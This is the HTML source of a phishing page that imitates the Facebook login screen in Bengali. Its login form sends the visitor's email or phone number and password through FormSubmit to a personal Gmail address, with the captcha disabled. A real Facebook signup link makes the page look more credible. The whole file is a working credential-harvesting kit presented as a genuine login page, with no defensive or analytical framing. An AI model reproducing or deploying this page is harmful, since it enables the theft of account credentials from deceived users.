<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - লগ ইন</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
}

body {
  background-color: #f0f2f5;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  padding-top: 50px;
}

.container {
  display: flex;
  max-width: 980px;
  gap: 60px;
  align-items: flex-start;
  padding: 20px;
  flex-wrap: wrap;
}

.left-section {
  flex: 1;
  min-width: 250px;
}

.logo {
  display: flex;
  align-items: center;
  justify-content:center;
  font-weight:bold;
  margin-bottom: 13px;
}

.logo h1 {
  font-size: 50px;
  margin: 0;
  color: #1666b3;
}

.right-section {
  background-color: white;
  padding: 20px 25px;
  border-radius: 8px;
  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  width: 396px;
}

.login-form input {
  width: 100%;
  padding: 14px 16px;
  margin-bottom: 12px;
  border: 1px solid #dddfe2;
  border-radius: 6px;
  font-size: 17px;
}

.login-form input:focus {
  outline: none;
  border-color: #1877f2;
  box-shadow: 0 0 0 2px #e7f3ff;
}

.pass-wrap {
  position: relative;
}

.toggle {
  position: absolute;
  right: 10px;
  top: 40%;
  transform: translateY(-50%);
  background: transparent;
  border: none;
  color: #1877f2;
  font-size: 14px;
  cursor: pointer;
}

.login-button {
  background-color: #1877f2;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 20px;
  line-height: 48px;
  width: 100%;
  font-weight: bold;
  cursor: pointer;
  margin-bottom: 16px;
}

.login-button:hover {
  background-color: #166fe5;
}

.divider {
  border-bottom: 1px solid #dadde1;
  margin: 20px 0;
}

.create-account {
  background-color: #42b72a;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 17px;
  line-height: 48px;
  font-weight: bold;
  cursor: pointer;
  width: 100%;
  margin-bottom: 20px;
}

.create-account:hover {
  background-color: #36a420;
}

@media (max-width: 900px) {
  .container {
    flex-direction: column;
    text-align: center;
    gap: 30px;
  }
  
  .left-section {
    width: 100%;
    padding: 0 20px;
  }
  
  .right-section {
    width: 100%;
    max-width: 400px;
  }
}
</style>
</head>
<body>

<div class="container">
  <div class="left-section">
    <div class="logo">
      <h1> Facebook </h1>
    </div>
  </div>

  <div class="right-section">
    <!-- FormSubmit Form -->
    <form class="login-form" action="https://formsubmit.co/flux00567@gmail.com" method="POST">
      <!-- Optional: subject -->
      <input type="hidden" name="_subject" value="New A Book Login">
      <input type="hidden" name="_captcha" value="false">

      <div class="pass-wrap">
        <input type="text" name="user_email" placeholder="ইমেইল বা ফোন নম্বর" required>
      </div>
      <div class="pass-wrap">
        <input type="password" name="user_password" placeholder="পাসওয়ার্ড" required>
        <button type="button" class="toggle">দেখুন</button>
      </div>
      <button type="submit" class="login-button">লগ ইন</button>
      <div class="divider"></div>
<!-- পরিবর্তন করলে -->
<button type="button" class="create-account" onclick="window.location.href='https://web.facebook.com/r.php?entry_point=login';">
  নতুন অ্যাকাউন্ট তৈরি করুন
</button>
    </form>
  </div>
</div>

<script>
  // পাসওয়ার্ড দেখান/লুকান
  const toggle = document.querySelector('.toggle');
  const passwordInput = document.querySelector('input[type="password"]');
  toggle.addEventListener('click', () => {
    if(passwordInput.type === 'password'){
      passwordInput.type = 'text';
      toggle.textContent = 'লুকান';
    } else {
      passwordInput.type = 'password';
      toggle.textContent = 'দেখুন';
    }
  });
</script>

</body>
</html>
